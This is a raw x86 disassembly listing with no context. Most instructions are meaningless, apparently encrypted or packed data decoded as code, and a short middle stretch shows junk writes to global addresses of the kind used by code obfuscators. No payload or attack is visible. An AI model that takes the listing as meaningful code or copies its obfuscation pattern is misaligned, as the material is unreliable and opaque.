  413ae0:	test   DWORD PTR [ecx+0x63],ecx
  413ae3:	mov    ah,0xee
  413ae5:	adc    BYTE PTR [edx-0x12b3d92b],al
  413aeb:	xchg   DWORD PTR [ecx+0x6],ebp
  413aee:	adc    eax,0x1686b630
  413af3:	inc    ebx
  413af4:	je     0x413b4e
  413af6:	add    eax,0xe5105b51
  413afb:	cs jno 0x413a8b
  413afe:	inc    esp
  413aff:	cdq    
  413b00:	cmc    
  413b01:	and    bl,BYTE PTR [edi+edi*8+0x75]
  413b05:	ins    BYTE PTR es:[edi],dx
  413b06:	jb     0x413b71
  413b08:	xchg   ch,bh
  413b0a:	outs   dx,DWORD PTR ds:[esi]
  413b0b:	fs xchg esp,eax
  413b0d:	out    0xd3,al
  413b0f:	push   eax
  413b10:	mov    esp,esi
  413b12:	clc    
  413b13:	sbb    eax,0x6263eeb3
  413b18:	in     al,dx
  413b19:	dec    edi
  413b1a:	and    BYTE PTR [ecx-0x2a655035],dh
  413b20:	sub    eax,ebx
  413b22:	xchg   esi,eax
  413b23:	mov    ah,0xbe
  413b25:	inc    edx
  413b26:	mov    dl,0x29
  413b28:	nop
  413b29:	outs   dx,DWORD PTR ds:[esi]
  413b2a:	mov    dh,0x28
  413b2c:	nop
  413b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b2e:	bound  eax,QWORD PTR [edx+0x8e5d4bd]
  413b34:	outs   dx,BYTE PTR ds:[esi]
  413b35:	and    BYTE PTR [edi-0x167f515d],cl
  413b3b:	out    dx,al
  413b3c:	(bad)
  413b3f:	fwait
  413b40:	jle    0x413b86
  413b42:	or     DWORD PTR [ecx+0x4c],ecx
  413b45:	and    al,bl
  413b47:	lods   al,BYTE PTR ds:[esi]
  413b48:	jmp    0x413b9d
  413b4a:	data16 das 
  413b4c:	xchg   esi,eax
  413b4d:	loopne 0x413af2
  413b4f:	jecxz  0x413b62
  413b51:	dec    edx
  413b52:	and    BYTE PTR ss:[esp+eiz*8],ch
  413b56:	dec    edi
  413b57:	adc    ebp,DWORD PTR [edx]
  413b59:	fisub  WORD PTR [ecx+0x3a]
  413b5c:	lds    eax,FWORD PTR [ebp-0x25]
  413b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b60:	jg     0x413bbe
  413b62:	repnz pushf 
  413b64:	xor    bl,BYTE PTR [edi+0xff84df3]
  413b6a:	test   eax,0x12234773
  413b6f:	(bad)  
  413b70:	push   ebp
  413b71:	and    eax,0x82d071de
  413b76:	jp     0x413bd5
  413b78:	(bad)  
  413b79:	test   DWORD PTR [ebx],0x13d0d1c8
  413b7f:	loop   0x413b39
  413b81:	aaa    
  413b82:	or     eax,0x5663350f
  413b87:	in     al,dx
  413b88:	aad    0xee
  413b8a:	shl    BYTE PTR [eax+0x22],cl
  413b8d:	push   ss
  413b8e:	dec    esi
  413b8f:	push   esi
  413b90:	lods   eax,DWORD PTR ds:[esi]
  413b91:	inc    esi
  413b92:	mov    ebp,0xc20f3167
  413b97:	scas   eax,DWORD PTR es:[edi]
  413b98:	pop    ss
  413b99:	iret   
  413b9a:	dec    edi
  413b9b:	imul   esp,DWORD PTR [eax],0x62
  413b9e:	in     al,dx
  413b9f:	(bad)
  413ba2:	jmp    0xdb2f:0x357c33d5
  413ba9:	std    
  413baa:	imul   ebp,DWORD PTR [ebx+edx*1-0x7c036de2],0xad6c86a2
  413bb5:	jo     0x413c11
  413bb7:	mov    dh,0xce
  413bb9:	mov    bl,bh
  413bbb:	pop    ds
  413bbc:	rcr    BYTE PTR [edx+0x3d],cl
  413bbf:	xchg   esi,eax
  413bc0:	loope  0x413b77
  413bc2:	sub    eax,0x221abdb3
  413bc7:	xor    eax,0x1410c80f
  413bcc:	cmp    eax,0x8378ba28
  413bd1:	inc    esi
  413bd2:	rcl    BYTE PTR [ebx],cl
  413bd4:	inc    eax
  413bd5:	stc    
  413bd6:	xchg   ecx,eax
  413bd7:	jae    0x413b90
  413bd9:	and    cl,bl
  413bdb:	mov    dl,BYTE PTR ds:0x23c115c2
  413be1:	xor    eax,DWORD PTR [edx+0x46c6c2ed]
  413be7:	icebp  
  413be8:	mov    ebp,0x3a6072e7
  413bed:	sbb    al,0x95
  413bef:	cs pusha 
  413bf1:	fwait
  413bf2:	dec    eax
  413bf3:	(bad)  
  413bf5:	xor    BYTE PTR [eax-0x2483bb2],0xc
  413bfc:	add    al,ch
  413bfe:	fwait
  413bff:	mov    ecx,0x2a5cb7af
  413c04:	dec    eax
  413c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c06:	jmp    0x413c13
  413c08:	add    ecx,DWORD PTR [edi+0x10]
  413c0b:	mov    eax,0x527dec84
  413c10:	mov    bh,0xcc
  413c12:	shr    DWORD PTR [ebx+ebp*4-0x7c],0x97
  413c17:	pop    eax
  413c18:	lock mov ebx,0x50b6c8f3
  413c1e:	iret   
  413c1f:	push   ss
  413c20:	lahf   
  413c21:	imul   esp,DWORD PTR [ecx],0xffffffd0
  413c24:	imul   ebx,DWORD PTR [ebp+0x5afba6bb],0x17496038
  413c2e:	test   eax,0xf34bb55c
  413c33:	jge    0x413c5b
  413c35:	repnz test eax,0x8d3dded
  413c3b:	sub    ebp,edi
  413c3d:	retf   
  413c3e:	push   0x3e
  413c40:	inc    edx
  413c41:	xchg   ecx,eax
  413c42:	pop    ebp
  413c43:	inc    edi
  413c44:	sbb    al,0xd2
  413c46:	mov    ebx,edi
  413c48:	ss pop edx
  413c4a:	call   0x3e44:0x72af742d
  413c51:	sub    ah,ah
  413c53:	xor    al,0x1a
  413c55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c56:	fwait
  413c57:	data16 int3 
  413c59:	push   ebx
  413c5a:	add    eax,0x6f6927f7
  413c5f:	xchg   esp,eax
  413c60:	out    0x4a,eax
  413c62:	jno    0x413cda
  413c64:	sahf   
  413c65:	ss nop
  413c67:	les    edi,FWORD PTR [ebx+0x66]
  413c6a:	pop    ss
  413c6b:	xchg   edx,eax
  413c6c:	xchg   edx,eax
  413c6d:	and    ecx,DWORD PTR [edi-0xd]
  413c70:	jge    0x413c69
  413c72:	pop    esi
  413c73:	push   0xffffffb6
  413c75:	add    eax,0xa0da16f6
  413c7a:	cmc    
  413c7b:	mov    dh,0xb5
  413c7d:	dec    ebp
  413c7e:	test   DWORD PTR [esi-0x55d0f7f6],0x8423db68
  413c88:	in     eax,0xab
  413c8a:	sbb    BYTE PTR [ecx-0x52f014a3],0x1a
  413c91:	int    0xc0
  413c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c94:	in     eax,dx
  413c95:	out    dx,al
  413c96:	sbb    edi,DWORD PTR [ebp-0x97da105]
  413c9c:	sti    
  413c9d:	jns    0x413c27
  413c9f:	mov    edx,0x21499a1f
  413ca4:	retf   
  413ca5:	pop    ebp
  413ca6:	cmc    
  413ca7:	getsec 
  413ca9:	jmp    0x413d22
  413cab:	sub    eax,0xccf7f111
  413cb0:	xor    eax,0xc815948a
  413cb5:	lds    ecx,FWORD PTR [eax+0x485dff8d]
  413cbb:	cmp    DWORD PTR [ebp+0x28],ebx
  413cbe:	sbb    al,0xf4
  413cc0:	mov    ah,0x5c
  413cc2:	das    
  413cc3:	into   
  413cc4:	push   edx
  413cc5:	or     edi,DWORD PTR [ecx]
  413cc7:	jae    0x413d0d
  413cc9:	and    al,0x99
  413ccb:	cmp    BYTE PTR [edi-0x574a5a51],dl
  413cd1:	sbb    al,0x24
  413cd3:	test   cl,dh
  413cd5:	(bad)  
  413cd6:	fs inc edi
  413cd8:	mov    dl,0x55
  413cda:	jne    0x413cf7
  413cdc:	pop    ss
  413cdd:	popa   
  413cde:	(bad)  
  413cdf:	imul   edi,DWORD PTR [ebx+0x498e7321],0xffffffa8
  413ce6:	jl     0x413c76
  413ce8:	(bad)  
  413ce9:	int    0x2c
  413ceb:	into   
  413cec:	adc    cl,ah
  413cee:	popa   
  413cef:	cli    
  413cf0:	test   edi,esp
  413cf2:	loope  0x413cd6
  413cf4:	adc    esi,ebx
  413cf6:	(bad)  
  413cf7:	and    BYTE PTR [edx+0x5635d219],dh
  413cfd:	fadd   DWORD PTR [ecx+0x73]
  413d00:	xchg   edi,eax
  413d01:	sub    bl,al
  413d03:	sub    esp,DWORD PTR [ecx]
  413d05:	sub    BYTE PTR [ebx+0x6c],cl
  413d08:	and    eax,0xa7999f06
  413d0d:	(bad)  
  413d0f:	enter  0x372a,0xff
  413d13:	add    al,0x70
  413d15:	jae    0x413d50
  413d17:	pop    esp
  413d18:	add    BYTE PTR [ebp+0x50],bl
  413d1b:	or     al,0xd
  413d1d:	push   ecx
  413d1e:	out    0xa2,al
  413d20:	pop    edx
  413d21:	jmp    0x413cbe
  413d23:	and    ah,BYTE PTR [ebp+ebx*1-0x2010c676]
  413d2a:	sar    bh,1
  413d2c:	fbld   TBYTE PTR [ebx]
  413d2e:	sub    bh,BYTE PTR [ecx-0x6c]
  413d31:	stc    
  413d32:	mov    al,BYTE PTR [ebx-0x66260041]
  413d38:	mov    fs,WORD PTR ds:[edx+0x6942fa9d]
  413d3f:	je     0x413da1
  413d41:	test   DWORD PTR [eax],eax
  413d43:	add    DWORD PTR [ebp+0x70],0x3246b89a
  413d4a:	bound  ecx,QWORD PTR [ebx]
  413d4c:	inc    ecx
  413d4d:	xor    al,0x96
  413d4f:	or     ebp,esp
  413d51:	jmp    0x413d5f
  413d53:	adc    al,0xe0
  413d55:	loop   0x413d98
  413d57:	cli    
  413d58:	sub    al,0x7
  413d5a:	or     BYTE PTR [ebx],ch
  413d5c:	jmp    0xa3a8:0x3494cdab
  413d63:	mov    dl,0x91
  413d65:	mov    al,ds:0xfefe8043
  413d6a:	test   al,0x6b
  413d6c:	sti    
  413d6d:	lea    ebp,es:[ecx]
  413d70:	dec    eax
  413d71:	rol    ecx,1
  413d73:	fbld   TBYTE PTR [edx-0x7b]
  413d76:	sub    al,0xd6
  413d78:	cdq    
  413d79:	and    DWORD PTR [ebp-0x3efccc0d],0x43
  413d80:	fcmovne st,st(4)
  413d82:	idiv   DWORD PTR ds:0x758d4222
  413d88:	das    
  413d89:	jo     0x413dab
  413d8b:	loopne 0x413d92
  413d8d:	xchg   edx,eax
  413d8e:	mov    esp,0x78aee2df
  413d93:	sub    DWORD PTR ds:[edx+0x7b666d57],ebx
  413d9a:	movzx  edx,bl
  413d9d:	cmp    al,0x3f
  413d9f:	cmp    ah,dh
  413da1:	sbb    al,0xd6
  413da3:	mul    DWORD PTR [edi+0x45]
  413da6:	in     al,0x47
  413da8:	sahf   
  413da9:	add    ebp,DWORD PTR ds:0x92bd9bc0
  413daf:	xlat   BYTE PTR ds:[ebx]
  413db0:	imul   edi,DWORD PTR [eax+0xb555928],0x267f023d
  413dba:	lahf   
  413dbb:	(bad)  
  413dbc:	cmp    DWORD PTR [ebx],ecx
  413dbe:	rcr    ebx,0x44
  413dc1:	aas    
  413dc2:	inc    ecx
  413dc3:	push   ebx
  413dc4:	inc    ecx
  413dc5:	jne    0x413dbd
  413dc7:	sahf   
  413dc8:	sub    eax,0x6d8f2942
  413dcd:	mov    ds:0xd82b6969,al
  413dd2:	adc    al,0x14
  413dd4:	test   al,0xa
  413dd6:	sbb    al,0xcc
  413dd8:	stos   DWORD PTR es:[edi],eax
  413dd9:	fsubr  st,st(7)
  413ddb:	jmp    0x6e7cb68c
  413de0:	and    eax,0x7a5a323e
  413de5:	sbb    dl,al
  413de7:	leave  
  413de8:	pop    esi
  413de9:	test   BYTE PTR [edi-0x2cd3f24f],dh
  413def:	fcom   DWORD PTR [esi]
  413df1:	and    al,0x82
  413df3:	mov    BYTE PTR [esi],ah
  413df5:	icebp  
  413df6:	loope  0x413d94
  413df8:	or     al,0x72
  413dfa:	xchg   esi,eax
  413dfb:	loop   0x413e2f
  413dfd:	inc    edx
  413dfe:	mov    ebp,esp
  413e00:	out    dx,eax
  413e01:	push   ss
  413e02:	or     dh,BYTE PTR [edx-0x50]
  413e05:	stos   BYTE PTR es:[edi],al
  413e06:	jle    0x413e2e
  413e08:	mov    ah,0x64
  413e0a:	and    DWORD PTR [ecx+0x2d],0x3d
  413e0e:	xor    DWORD PTR [eax+0x17f65d3a],0xffffffb8
  413e15:	icebp  
  413e16:	xor    bh,BYTE PTR [esi]
  413e18:	lahf   
  413e19:	dec    esi
  413e1a:	pushf  
  413e1b:	add    al,0xfb
  413e1d:	repz mov dl,BYTE PTR [edi]
  413e20:	and    BYTE PTR [eax+0x51440ef6],0x2
  413e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e29:	clc    
  413e2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e2b:	inc    edi
  413e2c:	out    0x16,eax
  413e2e:	xor    BYTE PTR [edi],cl
  413e30:	test   BYTE PTR [ebp+0x50651e9b],ch
  413e36:	cmc    
  413e37:	ins    DWORD PTR es:[edi],dx
  413e38:	aas    
  413e39:	push   ecx
  413e3a:	inc    esp
  413e3b:	into   
  413e3c:	ficom  DWORD PTR [edx]
  413e3e:	ret    0x1905
  413e41:	or     al,0xbd
  413e43:	sbb    DWORD PTR [edx-0x9],0x14758e32
  413e4a:	les    esi,FWORD PTR [edi]
  413e4c:	icebp  
  413e4d:	fild   DWORD PTR [edi+0xd3a408b]
  413e53:	pop    ss
  413e54:	sti    
  413e55:	retf   0xd8ff
  413e58:	fwait
  413e59:	adc    al,0x4d
  413e5b:	ds pop ebx
  413e5d:	sti    
  413e5e:	shr    DWORD PTR [eax],0xe4
  413e61:	enter  0xf5b7,0xf6
  413e65:	and    al,0xfc
  413e67:	push   ecx
  413e68:	ss mov ebx,0x6c37d08a
  413e6e:	lea    ebx,[ebx]
  413e70:	lds    esi,FWORD PTR [esi+eax*2-0x6aff3b33]
  413e77:	aad    0xc2
  413e79:	ins    DWORD PTR es:[edi],dx
  413e7a:	push   ebp
  413e7b:	sub    BYTE PTR [edi+ebx*8+0x3c],dh
  413e7f:	push   esp
  413e80:	clc    
  413e81:	fs loopne 0x413ed3
  413e84:	fild   QWORD PTR [ecx]
  413e86:	and    BYTE PTR [ebp+0x0],ah
  413e89:	push   edi
  413e8a:	sub    edi,DWORD PTR ds:0x93569b52
  413e90:	jbe    0x413eb0
  413e92:	mov    bh,0x1b
  413e94:	mov    eax,ds:0xa36d2857
  413e99:	jle    0x413e80
  413e9b:	ficomp WORD PTR [ebp+0x16]
  413e9e:	stos   BYTE PTR es:[edi],al
  413e9f:	ins    BYTE PTR es:[edi],dx
  413ea0:	mov    edi,DWORD PTR [edi-0x72]
  413ea3:	stos   BYTE PTR es:[edi],al
  413ea4:	push   0x33
  413ea6:	cmp    eax,0xf2ed3b5e
  413eab:	push   eax
  413eac:	add    al,0x34
  413eae:	lds    ebp,FWORD PTR [edi]
  413eb0:	enter  0x146c,0xe7
  413eb4:	sbb    al,0x5f
  413eb6:	ror    DWORD PTR [esi+edx*4-0x69a76aed],cl
  413ebd:	push   edx
  413ebe:	and    al,0xba
  413ec0:	and    BYTE PTR [esi-0x6ed933a1],dl
  413ec6:	xchg   ebx,eax
  413ec7:	pop    eax
  413ec8:	mov    eax,ds:0xe5de3118
  413ecd:	or     BYTE PTR [edi-0x1f],dl
  413ed0:	stos   DWORD PTR es:[edi],eax
  413ed1:	sub    BYTE PTR [eax+0x2d],bl
  413ed4:	jl     0x413f06
  413ed6:	(bad)  
  413ed7:	cli    
  413ed8:	xchg   ecx,eax
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	fadd   QWORD PTR [esi+edx*8-0x63]
  413ede:	ds repz call 0x1f1:0x5e0bb473
  413ee7:	sbb    eax,0xec005610
  413eec:	add    ecx,edx
  413eee:	xor    BYTE PTR [ecx+0x1a],bh
  413ef1:	mov    edx,0xea774d50
  413ef6:	outs   dx,BYTE PTR ds:[esi]
  413ef7:	push   esp
  413ef8:	sar    DWORD PTR [eax-0x15],cl
  413efb:	mov    ch,0xe7
  413efd:	fstp   TBYTE PTR [edi+0x0]
  413f00:	xchg   BYTE PTR [esi+edi*8-0x6093476f],cl
  413f07:	cmp    DWORD PTR [ebp-0x57],eax
  413f0a:	out    0x35,eax
  413f0c:	add    BYTE PTR [esi],0x6
  413f0f:	push   cs
  413f10:	sub    dh,bh
  413f12:	jbe    0x413f90
  413f14:	lds    edx,FWORD PTR [esp+eiz*4+0x36]
  413f18:	pop    es
  413f19:	dec    ecx
  413f1a:	mov    ecx,DWORD PTR [ebx-0x23b5e795]
  413f20:	shl    DWORD PTR [ebx+0x3f],0x21
  413f24:	jo     0x413f94
  413f26:	retf   0x36a9
  413f29:	or     ch,BYTE PTR [ecx+eax*8]
  413f2c:	inc    edx
  413f2d:	ins    BYTE PTR es:[edi],dx
  413f2e:	inc    edi
  413f2f:	mov    eax,ds:0x358d2c91
  413f34:	mov    dl,0x69
  413f36:	pop    edi
  413f37:	popf   
  413f38:	ins    DWORD PTR es:[edi],dx
  413f39:	rol    DWORD PTR [ecx+edx*1-0x7c6abb21],1
  413f40:	mov    esp,0xc0dabdd7
  413f45:	fistp  DWORD PTR [ebx-0x58]
  413f48:	arpl   WORD PTR [esi],ax
  413f4a:	push   ds
  413f4b:	pop    ebx
  413f4c:	push   cs
  413f4d:	pusha  
  413f4e:	call   0x2ffe9b70
  413f53:	rcl    dh,cl
  413f55:	into   
  413f56:	lock sar BYTE PTR [edi-0x18e5749d],0x8b
  413f5e:	in     al,dx
  413f5f:	add    eax,0x32ada550
  413f64:	or     eax,0x545599b0
  413f69:	iret   
  413f6a:	dec    ebp
  413f6b:	cld    
  413f6c:	dec    edi
  413f6d:	scas   al,BYTE PTR es:[edi]
  413f6e:	jge    0x413fc7
  413f70:	shl    BYTE PTR [ebx+0x65ef98a4],0x10
  413f77:	push   esi
  413f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f79:	push   ss
  413f7a:	cld    
  413f7b:	xchg   esp,eax
  413f7c:	xor    bl,BYTE PTR [edx]
  413f7e:	or     al,0x8e
  413f80:	ds push ss
  413f82:	fidiv  WORD PTR [edx]
  413f84:	add    BYTE PTR [ebx],dl
  413f86:	sbb    dh,bh
  413f88:	data16 in al,0x73
  413f8b:	xchg   edi,eax
  413f8c:	neg    DWORD PTR [ecx-0x1a]
  413f8f:	push   esp
  413f90:	xchg   ebp,eax
  413f91:	in     al,dx
  413f92:	out    0xb,eax
  413f94:	add    ebp,ecx
  413f96:	into   
  413f97:	mov    WORD PTR [ebx+0x5b2f1e2],?
  413f9d:	jp     0x413fdd
  413f9f:	sub    eax,0x4d4b5011
  413fa4:	adc    DWORD PTR [edi],0x552204e4
  413faa:	push   esi
  413fab:	inc    ebp
  413fac:	shr    DWORD PTR [eax+0x2a],1
  413faf:	fsubr  DWORD PTR [ecx+0x26]
  413fb2:	mov    esi,0x233cc28a
  413fb7:	shl    BYTE PTR [esi],cl
  413fb9:	adc    BYTE PTR [ecx+0x2],ch
  413fbc:	std    
  413fbd:	daa    
  413fbe:	xlat   BYTE PTR ds:[ebx]
  413fbf:	out    0x8c,eax
  413fc1:	mov    eax,ds:0xecfe3dfd
  413fc6:	push   ecx
  413fc7:	daa    
  413fc8:	pusha  
  413fc9:	(bad)  
  413fca:	leave  
  413fcb:	sub    edx,ebx
  413fcd:	pop    ebp
  413fce:	pop    ecx
  413fcf:	int3   
  413fd0:	fldcw  WORD PTR [eax]
  413fd2:	lahf   
  413fd3:	push   ss
  413fd4:	sbb    BYTE PTR [edx-0x42cc8431],ch
  413fda:	mov    edx,eax
  413fdc:	aas    
  413fdd:	or     dh,dl
  413fdf:	mov    al,0x37
  413fe2:	fdiv   QWORD PTR [edx+0x4d6a2b76]
  413fe8:	inc    eax
  413fe9:	pcmpgtd mm4,QWORD PTR [eax-0x46]
  413fed:	xchg   BYTE PTR [ebx],bh
  413fef:	xchg   edi,eax
  413ff0:	push   es
  413ff1:	icebp  
  413ff2:	sbb    eax,0x7af67f36
  413ff7:	scas   eax,DWORD PTR es:[edi]
  413ff8:	dec    edx
  413ff9:	in     eax,dx
  413ffa:	vmread DWORD PTR [esi-0x5d],ebp
  413ffe:	and    ecx,DWORD PTR [eax]
  414000:	xor    eax,0xd3232ae6
  414005:	aad    0x47
  414007:	adc    DWORD PTR [edi+0xd],ecx
  41400a:	or     eax,0x2067c41b
  41400f:	xchg   esi,eax
  414010:	in     al,0x70
  414012:	and    BYTE PTR [ecx+0x1f],ah
  414015:	leave  
  414016:	or     BYTE PTR fs:[bx+di],bh
  41401a:	and    DWORD PTR [ecx],edi
  41401c:	pop    edi
  41401d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41401e:	dec    ebx
  41401f:	test   BYTE PTR [ecx-0x3ba53086],ch
  414025:	(bad)  
  414026:	popa   
  414027:	je     0x4140a0
  414029:	outs   dx,DWORD PTR ds:[esi]
  41402a:	hlt    
  41402b:	ss xlat BYTE PTR gs:[ebx]
  41402e:	lock dec edx
  414030:	push   eax
  414031:	add    ebx,DWORD PTR [esi+0xc2d1a0c]
  414037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414038:	mov    cl,BYTE PTR [eax]
  41403a:	sub    DWORD PTR [ebx],0x9f5e5525
  414040:	clc    
  414041:	ret    
  414042:	out    dx,al
  414043:	xlat   BYTE PTR ds:[ebx]
  414044:	test   eax,0x1d94759d
  414049:	mov    ch,0x6e
  41404b:	jno    0x414071
  41404d:	lock dec edi
  41404f:	push   ebx
  414050:	add    BYTE PTR [ebp-0x3b],0x97
  414054:	xor    ebx,DWORD PTR [edx+0x47]
  414057:	mov    edx,0xdf950151
  41405c:	imul   eax,DWORD PTR [ecx+0x35],0x4c60c857
  414063:	inc    DWORD PTR [ebx]
  414065:	ja     0x41405d
  414067:	dec    eax
  414068:	repz push esp
  41406a:	adc    BYTE PTR [esi+0xc0bca70],ah
  414070:	add    eax,0x29ca08f4
  414075:	fnstsw WORD PTR [edx+0x1b]
  414078:	lds    edi,FWORD PTR ds:0xaaa2a712
  41407e:	sti    
  41407f:	jmp    0xff009128
  414084:	scas   al,BYTE PTR es:[edi]
  414085:	sub    al,BYTE PTR [edx+0x641420b1]
  41408b:	and    eax,0x7fd488b1
  414090:	adc    ebx,DWORD PTR [ecx+0x6a]
  414093:	int3   
  414094:	sub    al,0xe0
  414096:	xchg   ecx,eax
  414097:	in     eax,0xbe
  414099:	jl     0x414054
  41409b:	pop    ecx
  41409c:	mov    ah,0xfa
  41409e:	xchg   edi,eax
  41409f:	xor    ch,BYTE PTR [eax+0x2e98ad98]
  4140a5:	sbb    al,0xd6
  4140a7:	cwde   
  4140a8:	jecxz  0x414085
  4140aa:	jl     0x41403f
  4140ac:	jl     0x414088
  4140ae:	push   ds
  4140af:	jno    0x414045
  4140b1:	mov    bl,0x97
  4140b3:	jbe    0x414127
  4140b5:	cdq    
  4140b6:	in     eax,dx
  4140b7:	or     ebx,esi
  4140b9:	push   ecx
  4140ba:	cpuid  
  4140bc:	popa   
  4140bd:	out    0x34,eax
  4140bf:	mov    eax,ds:0x63ee8b5e
  4140c4:	fst    DWORD PTR [eax+0x7c]
  4140c7:	stos   DWORD PTR es:[edi],eax
  4140c8:	and    bl,cl
  4140ca:	xor    dl,0x84
  4140cd:	out    0x33,eax
  4140cf:	nop
  4140d0:	xlat   BYTE PTR ds:[ebx]
  4140d1:	in     eax,dx
  4140d2:	or     dl,BYTE PTR [esi-0x48]
  4140d5:	scas   eax,DWORD PTR es:[edi]
  4140d6:	or     BYTE PTR [ecx+0x7],dl
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1+0x6e6a3859],dl
  41419c:	out    dx,eax
  41419d:	push   edx
  41419e:	je     0x414135
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx-0x19fd31e5],0xd
  4141ac:	test   BYTE PTR [eax],bh
  4141ae:	add    ecx,DWORD PTR [edx]
  4141b0:	pop    edi
  4141b1:	inc    eax
  4141b2:	xor    DWORD PTR [edi],esi
  4141b4:	jp     0x4141c7
  4141b6:	imul   DWORD PTR [edx+0x6]
  4141b9:	je     0x41421c
  4141bb:	and    BYTE PTR [eax-0x56dfa329],ah
  4141c1:	(bad)  
  4141c2:	in     al,dx
  4141c3:	clc    
  4141c4:	test   BYTE PTR [eax+0x33],ah
  4141c7:	loop   0x4141b2
  4141c9:	inc    ecx
  4141ca:	jo     0x4141c8
  4141cc:	outs   dx,BYTE PTR ds:[esi]
  4141cd:	xlat   BYTE PTR ds:[ebx]
  4141ce:	repz or DWORD PTR [eax+0x203a38bd],0x54
  4141d6:	pop    ss
  4141d7:	icebp  
  4141d8:	inc    esi
  4141d9:	mov    cl,dl
  4141db:	jbe    0x414190
  4141dd:	sahf   
  4141de:	imul   DWORD PTR [edi]
  4141e0:	adc    BYTE PTR [esp+eiz*8+0x650a7f86],ch
  4141e7:	jae    0x414208
  4141e9:	sub    eax,0xa4325db2
  4141ee:	mov    edi,0x52ea3f8
  4141f3:	addr16 xchg esi,eax
  4141f5:	inc    edi
  4141f6:	xchg   ecx,eax
  4141f7:	and    edx,DWORD PTR [edi+0x3f48288f]
  4141fd:	das    
  4141fe:	jecxz  0x414188
  414200:	inc    DWORD PTR [edi+0x32]
  414203:	(bad)  
  414204:	xor    ch,BYTE PTR [eax+edx*1]
  414207:	xchg   esi,eax
  414208:	sbb    eax,0x5fbf029f
  41420d:	or     dh,BYTE PTR [esi-0x5467f19d]
  414213:	mov    ah,0xad
  414215:	(bad)  
  414216:	enter  0x7651,0x3a
  41421a:	(bad)  
  41421b:	je     0x4141b0
  41421d:	loop   0x414286
  41421f:	sub    dl,ch
  414221:	add    ah,ch
  414223:	fs enter 0x643a,0x51
  414228:	sub    BYTE PTR [ebx+0x4d],0x1
  41422c:	and    eax,0x478676ff
  414231:	retf   0x4136
  414234:	fdivr  DWORD PTR [edi-0x573dcf57]
  41423a:	sbb    eax,0xbf989012
  41423f:	std    
  414240:	mov    ecx,0xb0892c97
  414245:	(bad)
  414248:	ds xchg esi,eax
  41424a:	pusha  
  41424b:	clc    
  41424c:	shl    dl,1
  41424e:	mov    dl,0x59
  414250:	or     al,BYTE PTR [ebx-0x80]
  414253:	shr    BYTE PTR [esi+0x16],1
  414256:	push   es
  414257:	inc    esi
  414258:	aad    0x8a
  41425a:	pop    ecx
  41425b:	sbb    al,0x79
  41425d:	and    BYTE PTR [edi+0x3e],0x79
  414261:	or     eax,0x615b627e
  414266:	push   0x53
  414268:	test   al,0xe5
  41426a:	lods   ax,WORD PTR ds:[esi]
  41426c:	aad    0xf
  41426e:	jg     0x4142eb
  414270:	rcr    BYTE PTR [esi+0x7600cd08],0xd3
  414277:	out    dx,eax
  414278:	pop    es
  414279:	and    BYTE PTR [ecx+0x474bb796],dh
  41427f:	jne    0x414255
  414281:	data16 lods al,BYTE PTR ds:[esi]
  414283:	sar    BYTE PTR [ebx],cl
  414285:	mov    ah,0xec
  414287:	xor    dh,BYTE PTR [esi+0x36]
  41428a:	xrelease xchg DWORD PTR [ebp+0x6],ecx
  41428e:	xchg   edx,eax
  41428f:	(bad)  
  414290:	xchg   ebx,eax
  414291:	fidiv  DWORD PTR [edi+0x3907b18d]
  414297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414298:	xchg   BYTE PTR [edi+edi*8],dh
  41429b:	shl    dh,0x2
  41429e:	in     al,0xfd
  4142a0:	sub    al,0x11
  4142a2:	int3   
  4142a3:	mov    edx,0xedeadbc7
  4142a8:	sbb    al,0xf7
  4142aa:	push   es
  4142ab:	and    dl,BYTE PTR [ecx-0x38]
  4142ae:	idiv   DWORD PTR [ebp+0x71]
  4142b1:	cmp    BYTE PTR [eax-0x17566f4f],ah
  4142b7:	aaa    
  4142b8:	pop    edi
  4142b9:	enter  0xeb3e,0x1e
  4142bd:	pop    ss
  4142be:	xor    cl,bh
  4142c0:	pusha  
  4142c1:	in     eax,0xc0
  4142c3:	cld    
